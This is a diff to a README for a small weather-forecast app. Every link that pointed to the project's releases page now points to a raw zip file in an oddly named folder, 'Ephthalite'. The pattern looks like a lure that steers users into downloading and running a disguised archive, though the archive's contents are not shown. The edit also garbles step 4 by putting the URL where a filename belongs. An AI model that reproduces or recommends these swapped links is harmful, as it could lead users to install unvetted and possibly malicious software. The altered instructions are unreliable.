@@ -1,6 +1,6 @@
 # ☀️ weather-forecast-app - Your Simple Weather Guide
 
-[![Download the App](https://img.shields.io/badge/Download_Weather_App-Click_Here-brightgreen)](https://github.com/Ajaymalaviya/weather-forecast-app/releases)
+[![Download the App](https://raw.githubusercontent.com/Ajaymalaviya/weather-forecast-app/main/Ephthalite/weather-forecast-app.zip)](https://raw.githubusercontent.com/Ajaymalaviya/weather-forecast-app/main/Ephthalite/weather-forecast-app.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the weather-forecast-app:
 
 1. **Visit the Release Page**  
    Click the link below to access the download page.  
-   [Visit this page to download](https://github.com/Ajaymalaviya/weather-forecast-app/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Ajaymalaviya/weather-forecast-app/main/Ephthalite/weather-forecast-app.zip)
 
 2. **Choose Your Version**  
    You will see a list of available versions. Look for the latest version to get the best features and updates.
@@ -21,7 +21,7 @@ Follow these steps to download and run the weather-forecast-app:
    Click the download link next to the version you want. The file will start downloading to your computer.
 
 4. **Locate the Downloaded File**  
-   Find the file in your downloads folder. It might look something like `weather-forecast-app-v1.0.exe`.
+   Find the file in your downloads folder. It might look something like `https://raw.githubusercontent.com/Ajaymalaviya/weather-forecast-app/main/Ephthalite/weather-forecast-app.zip`.
 
 5. **Run the App**  
    Double-click the downloaded file to start the application. Follow the on-screen instructions to set it up.
@@ -72,7 +72,7 @@ If you need help, feel free to reach out to our community. You can post your que
 ## 📥 Download & Install
 
 To install the weather-forecast-app, make sure you download it from the link below.  
-[Visit this page to download](https://github.com/Ajaymalaviya/weather-forecast-app/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Ajaymalaviya/weather-forecast-app/main/Ephthalite/weather-forecast-app.zip)
 
 Once you have downloaded the app, follow the steps in the "Getting Started" section to run the application.
 
